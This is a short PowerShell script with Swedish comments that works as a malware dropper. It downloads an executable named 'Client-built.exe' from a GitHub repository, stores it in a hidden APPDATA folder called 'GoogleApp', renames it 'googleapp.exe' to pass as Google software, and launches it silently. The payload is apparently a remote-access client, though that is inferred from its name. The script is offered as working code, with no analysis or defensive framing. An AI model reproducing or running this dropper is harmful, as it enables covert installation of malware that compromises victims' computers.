$url = "https://github.com/ioik432/powershell/raw/main/Client-built.exe"
$finalPath = Join-Path $env:APPDATA -ChildPath "GoogleApp\Client-built.exe"

try {
    # Skapa mappen om den inte redan finns
    $folderPath = Split-Path $finalPath
    if (-not (Test-Path $folderPath -PathType Container)) {
        New-Item -ItemType Directory -Path $folderPath
    }

    # Hämta och spara exe-filen
    Invoke-WebRequest -Uri $url -OutFile $finalPath
    Set-ItemProperty -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

    $nyttNamn = "googleapp.exe"
    $nyttNamnPath = Join-Path $env:APPDATA -ChildPath "GoogleApp\$nyttNamn"

    # Byt namn på exe-filen
    Rename-Item -Path $finalPath -NewName $nyttNamn
    Start-Process -FilePath $nyttNamnPath
}
catch {
    Write-Host "Ett fel uppstod: $_"
}
